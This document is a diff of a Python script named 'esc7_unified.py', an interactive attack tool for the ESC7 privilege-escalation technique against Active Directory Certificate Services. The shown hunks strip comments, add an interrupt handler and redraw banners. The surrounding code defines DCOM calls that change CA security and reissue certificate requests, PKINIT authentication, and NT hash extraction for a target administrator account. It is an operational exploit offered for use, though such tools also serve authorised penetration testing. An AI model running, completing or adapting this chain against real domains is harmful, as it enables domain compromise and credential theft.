@@ -1,30 +1,5 @@
 #!/usr/bin/env python3
-"""
-ESC7 Full Attack Chain — Completely Self-Contained
-===================================================
-Handles both CA dispositions:
-  - Issue (Request Disposition = Issue): cert issued immediately, skip to auth
-  - Pending/Denied: full ESC7 chain with issue step
 
-Features:
-  * Interactive prompts for missing inputs
-  * Auto-discovers CA name AND FQDN via LDAP
-  * Handles immediate issuance (no pending step needed)
-  * Captures Request ID automatically
-  * Resume support: --start-from N --request-id ID
-  * Built-in PKINIT auth, CA management, DCOM/RPC structures
-  * Comprehensive error handling at every layer
-  * Detailed error messages with remediation hints
-  * Summary box with copy-paste resume command
-
-Usage:
-    python3 esc7_unified.py                    # fully interactive
-    python3 esc7_unified.py -u user@dom -p pass --dc-ip 10.0.0.1
-        --target-host dc01.dom.local --upn admin@dom.local
-
-Resume:
-    python3 esc7_unified.py ... --start-from 5 --request-id 42
-"""
 
 import argparse
 import sys
@@ -40,11 +15,19 @@ import logging as py_logging
 import socket
 import traceback as tb
 from random import getrandbits
+import signal
+import threading
+
+_interrupt_event = threading.Event()
+
+def _signal_handler(signum, frame):
+    _interrupt_event.set()
+    raise KeyboardInterrupt
+
+signal.signal(signal.SIGINT, _signal_handler)
+
 from typing import Optional, Union, List, Tuple
 
-# ============================================================================
-# Dependency guard
-# ============================================================================
 _MISSING = []
 for _pkg, _install in [
     ("certipy", "certipy-ad"),
@@ -64,9 +47,6 @@ if _MISSING:
         print(f"      {pkg}  ->  pip install {inst}")
     sys.exit(1)
 
-# ============================================================================
-# Certipy lib imports
-# ============================================================================
 try:
     from certipy.lib.target import Target
     from certipy.lib.logger import logging as certipy_logging
@@ -101,9 +81,6 @@ except ImportError:
         print("[-] Try: pip install --upgrade certipy-ad")
         sys.exit(1)
 
-# ============================================================================
-# Impacket imports
-# ============================================================================
 try:
     from impacket.dcerpc.v5 import rpcrt, rrp, scmr
     from impacket.dcerpc.v5.dcom.oaut import VARIANT
@@ -153,10 +130,6 @@ except ImportError as _e:
     print(f"[-] Failed to import crypto libraries: {_e}")
     sys.exit(1)
 
-
-# ============================================================================
-# Custom Exceptions
-# ============================================================================
 class ESC7Error(Exception):
     """Base exception for all ESC7 attack errors."""
     def __init__(self, message: str, hint: str = "", recoverable: bool = False):
@@ -164,38 +137,27 @@ class ESC7Error(Exception):
         self.hint        = hint
         self.recoverable = recoverable
 
-
 class NetworkError(ESC7Error):
     """Raised for connectivity / network failures."""
-
 
 class AuthError(ESC7Error):
     """Raised for authentication failures."""
 
-
 class LDAPError(ESC7Error):
     """Raised for LDAP-related failures."""
-
 
 class DCOMError(ESC7Error):
     """Raised for DCOM/RPC failures."""
 
-
 class CertificateError(ESC7Error):
     """Raised for certificate operation failures."""
-
 
 class ConfigError(ESC7Error):
     """Raised for configuration / input validation failures."""
 
-
 class StepError(ESC7Error):
     """Raised when an attack step fails."""
 
-
-# ============================================================================
-# Colors & UI
-# ============================================================================
 class C:
     H  = '\033[95m'
     B  = '\033[94m'
@@ -206,7 +168,6 @@ class C:
     BD = '\033[1m'
     DIM = '\033[2m'
 
-
 def _info(m: str)  -> None: print(f"{C.B}[*]{C.X} {m}")
 def _ok(m: str)    -> None: print(f"{C.G}[+]{C.X} {m}")
 def _warn(m: str)  -> None: print(f"{C.Y}[!]{C.X} {m}")
@@ -216,16 +177,16 @@ def _debug(m: str, enabled: bool = False) -> None:
     if enabled:
         print(f"{C.DIM}[DBG] {m}{C.X}")
 
-
 def _banner(t: str) -> None:
-    print(f"\n{C.H}{'='*70}{C.X}")
-    print(f"{C.BD}{C.B}  {t}{C.X}")
-    print(f"{C.H}{'='*70}{C.X}\n")
-
+    box_w = 80
+    inner = box_w - 2
+    pad = lambda text: "║  " + text + " " * (inner - len(text) - 4) + "║"
+    print(f"{C.BD}{C.B}╔" + "═" * inner + "╗{C.X}")
+    print(f"{C.BD}{C.B}" + pad(t) + f"{C.X}")
+    print(f"{C.BD}{C.B}╚" + "═" * inner + "╝{C.X}")
 
 def _section(t: str) -> None:
     print(f"\n{C.B}── {t} {'─'*(65-len(t))}{C.X}")
-
 
 def _prompt(
     text: str,
@@ -262,7 +223,6 @@ def _prompt(
             continue
         return result
 
-
 def _prompt_optional(
     text: str,
     default: str = "",
@@ -275,7 +235,6 @@ def _prompt_optional(
         return default
     return val if val else default
 
-
 def _prompt_bool(text: str, default: bool = False) -> bool:
     suffix = " [Y/n]: " if default else " [y/N]: "
     try:
@@ -285,7 +244,6 @@ def _prompt_bool(text: str, default: bool = False) -> bool:
     if not val:
         return default
     return val in ("y", "yes")
-
 
 def _prompt_choice(options: List[str], prompt: str = "Select") -> int:
     """Show numbered options and return the selected 0-based index."""
@@ -303,10 +261,6 @@ def _prompt_choice(options: List[str], prompt: str = "Select") -> int:
         except (EOFError, KeyboardInterrupt):
             raise ESC7Error("User cancelled selection.")
 
-
-# ============================================================================
-# Input Validators
-# ============================================================================
 def _is_valid_ip(s: str) -> bool:
     try:
         socket.inet_aton(s)
@@ -319,7 +273,6 @@ def _is_valid_ip(s: str) -> bool:
     except socket.gaierror:
         return False
 
-
 def _is_valid_hostname(s: str) -> bool:
     if not s or len(s) > 253:
         return False
@@ -328,7 +281,6 @@ def _is_valid_hostname(s: str) -> bool:
     allowed = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9\-]{0,61}[A-Za-z0-9])?$")
     return all(allowed.match(part) for part in s.split("."))
 
-
 def _is_valid_upn(s: str) -> bool:
     parts = s.split("@")
     if len(parts) != 2:
@@ -336,10 +288,8 @@ def _is_valid_upn(s: str) -> bool:
     user, domain = parts
     return bool(user) and bool(domain) and "." in domain
 
-
 def _is_valid_domain(s: str) -> bool:
     return bool(s) and "." in s and "@" not in s
-
 
 def _validate_pfx_path(path: str) -> bool:
     """Validate that a PFX output path is writable."""
@@ -350,15 +300,12 @@ def _validate_pfx_path(path: str) -> bool:
         return False
     return os.access(directory, os.W_OK)
 
-
 def _validate_existing_pfx(path: str) -> bool:
     """Validate that a PFX file exists and is readable."""
     return bool(path) and os.path.isfile(path) and os.access(path, os.R_OK)
 
-
-# ============================================================================
 # Connectivity Pre-checks
-# ============================================================================
+
 def _tcp_reachable(host: str, port: int, timeout: float = 3.0) -> bool:
     """Return True if host:port accepts a TCP connection."""
     try:
@@ -366,7 +313,6 @@ def _tcp_reachable(host: str, port: int, timeout: float = 3.0) -> bool:
             return True
     except (OSError, socket.timeout):
         return False
-
 
 def precheck_connectivity(dc_ip: str, ca_fqdn: str = "") -> None:
     """
@@ -406,10 +352,6 @@ def precheck_connectivity(dc_ip: str, ca_fqdn: str = "") -> None:
         )
     _ok("All connectivity checks passed.")
 
-
-# ============================================================================
-# Log Capture
-# ============================================================================
 class LogCapture:
     """
     Context manager that:
@@ -614,10 +556,6 @@ class LogCapture:
             for line in self.lines:
                 print(f"  {C.DIM}{line}{C.X}")
 
-
-# ============================================================================
-# Constants & DCOM Structures
-# ============================================================================
 IF_NOREMOTEICERTADMINBACKUP = 0x40
 CR_PROP_TEMPLATES           = 0x0000001D
 
@@ -647,7 +585,6 @@ CERTSRV_ERRORS = {
     0x80070057: "E_INVALIDARG — invalid argument",
 }
 
-
 def _certsrv_error(code: int) -> str:
     code &= 0xFFFFFFFF
     known = CERTSRV_ERRORS.get(code)
@@ -658,7 +595,6 @@ def _certsrv_error(code: int) -> str:
     except Exception:
         return f"0x{code:08X}: unknown error"
 
-
 class DCERPCSessionError(DCERPCException):
     def __init__(self, error_string=None, error_code=None, packet=None):
         DCERPCException.__init__(self, error_string, error_code, packet)
@@ -667,10 +603,8 @@ class DCERPCSessionError(DCERPCException):
         self.error_code &= 0xFFFFFFFF
         return f"CASessionError: {_certsrv_error(self.error_code)}"
 
-
 class CERTTRANSBLOB(NDRSTRUCT):
     structure = (("cb", ULONG), ("pb", PBYTE))
-
 
 # ── RPC call structures ───────────────────────────────────────────────────────
 class ICertAdminDResubmitRequest(DCOMCALL):
@@ -681,19 +615,15 @@ class ICertAdminDResubmitRequest(DCOMCALL):
         ("pwszExtensionName", LPWSTR),
     )
 
-
 class ICertAdminDResubmitRequestResponse(DCOMANSWER):
     structure = (("pdwDisposition", ULONG),)
-
 
 class ICertAdminDDenyRequest(DCOMCALL):
     opnum     = 6
     structure = (("pwszAuthority", LPWSTR), ("pdwRequestId", DWORD))
 
-
 class ICertAdminDDenyRequestResponse(DCOMANSWER):
     structure = (("ErrorCode", ULONG),)
-
 
 class ICertAdminD2GetCAProperty(DCOMCALL):
     opnum     = 32
@@ -704,10 +634,8 @@ class ICertAdminD2GetCAProperty(DCOMCALL):
         ("PropType",      LONG),
     )
 
-
 class ICertAdminD2GetCAPropertyResponse(DCOMANSWER):
     structure = (("pctbPropertyValue", CERTTRANSBLOB),)
-
 
 class ICertAdminD2SetCAProperty(DCOMCALL):
     opnum     = 33
@@ -719,19 +647,15 @@ class ICertAdminD2SetCAProperty(DCOMCALL):
         ("pctbPropertyValue", CERTTRANSBLOB),
     )
 
-
 class ICertAdminD2SetCAPropertyResponse(DCOMANSWER):
     structure = (("ErrorCode", ULONG),)
-
 
 class ICertAdminD2GetCASecurity(DCOMCALL):
     opnum     = 36
     structure = (("pwszAuthority", LPWSTR),)
 
-
 class ICertAdminD2GetCASecurityResponse(DCOMANSWER):
     structure = (("pctbSD", CERTTRANSBLOB),)
-
 
 class ICertAdminD2SetCASecurity(DCOMCALL):
     opnum     = 37
@@ -740,14 +664,9 @@ class ICertAdminD2SetCASecurity(DCOMCALL):
         ("pctbSD",        CERTTRANSBLOB),
     )
 
-
 class ICertAdminD2SetCASecurityResponse(DCOMANSWER):
     structure = (("ErrorCode", LONG),)
 
-
-# ============================================================================
-# DCOM Interface Wrappers
-# ============================================================================
 class ICertCustom(IRemUnknown):
     def request(self, req, *args, **kwargs):
         req["ORPCthis"]          = self.get_cinstance().get_ORPCthis()
@@ -773,28 +692,21 @@ class ICertCustom(IRemUnknown):
                 ) from e
             raise
 
-
 class ICertAdminD(ICertCustom):
     def __init__(self, interface):
         super().__init__(interface)
         self._iid = IID_ICertAdminD
-
 
 class ICertAdminD2(ICertCustom):
     def __init__(self, interface):
         super().__init__(interface)
         self._iid = IID_ICertAdminD2
 
-
 class ICertRequestD2(ICertCustom):
     def __init__(self, interface):
         super().__init__(interface)
         self._iid = IID_ICertRequestD2
 
-
-# ============================================================================
-# CAConfiguration
-# ============================================================================
 class CAConfiguration:
     def __init__(
         self,
@@ -812,10 +724,6 @@ class CAConfiguration:
         self.interface_flags        = interface_flags
         self.security               = security
 
-
-# ============================================================================
-# LdapShell & DummyDomainDumper
-# ============================================================================
 class LdapShell(_LdapShell):
     def __init__(self, tcp_shell, domain_dumper, client):
         super().__init__(tcp_shell, domain_dumper, client)
@@ -837,15 +745,10 @@ class LdapShell(_LdapShell):
         print("Bye!")
         return True
 
-
 class DummyDomainDumper:
     def __init__(self, root):
         self.root = root
 
-
-# ============================================================================
-# Key derivation helper
-# ============================================================================
 def truncate_key(value: bytes, keysize: int) -> bytes:
     output, current_num = b"", 0
     while len(output) < keysize:
@@ -864,10 +767,8 @@ def truncate_key(value: bytes, keysize: int) -> bytes:
         current_num += 1
     return output
 
-
-# ============================================================================
 # Authenticate (PKINIT + U2U NT hash extraction)
-# ============================================================================
+
 class Authenticate:
     def __init__(
         self,
@@ -1457,10 +1358,6 @@ class Authenticate:
         )
         return nt_hash
 
-
-# ============================================================================
-# CA Class
-# ============================================================================
 class CA:
     def __init__(
         self,
@@ -1964,10 +1861,6 @@ class CA:
             remove=True,
         )
 
-
-# ============================================================================
-# Target Builder
-# ============================================================================
 def build_target(
     username:     str,
     password:     Optional[str],
@@ -2017,10 +1910,6 @@ def build_target(
             ),
         ) from e
 
-
-# ============================================================================
-# CA Discovery
-# ============================================================================
 def discover_ca(target) -> Tuple[str, str]:
     """Returns (ca_name, ca_fqdn)."""
     _info("Discovering CA via LDAP...")
@@ -2094,10 +1983,8 @@ def discover_ca(target) -> Tuple[str, str]:
     except Exception as e:
         raise ConfigError(f"CA selection failed: {e}") from e
 
-
-# ============================================================================
 # ESC7 Attack Orchestrator
-# ============================================================================
+
 class ESC7Attack:
     def __init__(self, args):
         self.args                        = args
@@ -2746,14 +2633,12 @@ class ESC7Attack:
         self.print_summary(7)
         self.cleanup()
 
-
-# ============================================================================
-# Interactive Input Collector
-# ============================================================================
 def collect_interactive(args) -> argparse.Namespace:
-    print("\n" + C.H + "="*70 + C.X)
-    print(C.BD + C.B + "  ESC7 Unified Attack — Interactive Setup" + C.X)
-    print(C.H + "="*70 + C.X + "\n")
+    print(f"{C.BD}{C.B}╔══════════════════════════════════════════════════════════════════════════════╗{C.X}")
+    print(f"{C.BD}{C.B}║  ESC7 ADCS ATTACK CHAIN                                                      ║{C.X}")
+    print(f"{C.BD}{C.B}║  Active Directory Certificate Services — ESC7 Exploitation                   ║{C.X}")
+    print(f"{C.BD}{C.B}║                                                                              ║{C.X}")
+    print(f"{C.BD}{C.B}╚══════════════════════════════════════════════════════════════════════════════╝{C.X}")
 
     try:
         if not args.user:
@@ -2883,10 +2768,6 @@ def collect_interactive(args) -> argparse.Namespace:
 
     return args
 
-
-# ============================================================================
-# Argument Parser
-# ============================================================================
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(
         description=(
@@ -3024,10 +2905,6 @@ Examples:
 
     return args
 
-
-# ============================================================================
-# Main
-# ============================================================================
 def main() -> None:
     args = parse_args()
 
@@ -3038,9 +2915,11 @@ def main() -> None:
         datefmt="%H:%M:%S",
     )
 
-    print(f"\n{C.H}{'='*70}{C.X}")
-    print(f"{C.BD}{C.B}  ESC7 ADCS Attack Chain — Starting{C.X}")
-    print(f"{C.H}{'='*70}{C.X}\n")
+    print(f"{C.BD}{C.B}╔══════════════════════════════════════════════════════════════════════════════╗{C.X}")
+    print(f"{C.BD}{C.B}║  ESC7 ADCS ATTACK CHAIN                                                      ║{C.X}")
+    print(f"{C.BD}{C.B}║  Active Directory Certificate Services — ESC7 Exploitation                   ║{C.X}")
+    print(f"{C.BD}{C.B}║                                                                              ║{C.X}")
+    print(f"{C.BD}{C.B}╚══════════════════════════════════════════════════════════════════════════════╝{C.X}")
 
     # Pre-flight connectivity check
     if not args.skip_precheck:
@@ -3091,7 +2970,6 @@ def main() -> None:
             tb.print_exc()
         attack.print_summary(0)
         sys.exit(1)
-
 
 if __name__ == "__main__":
     main()
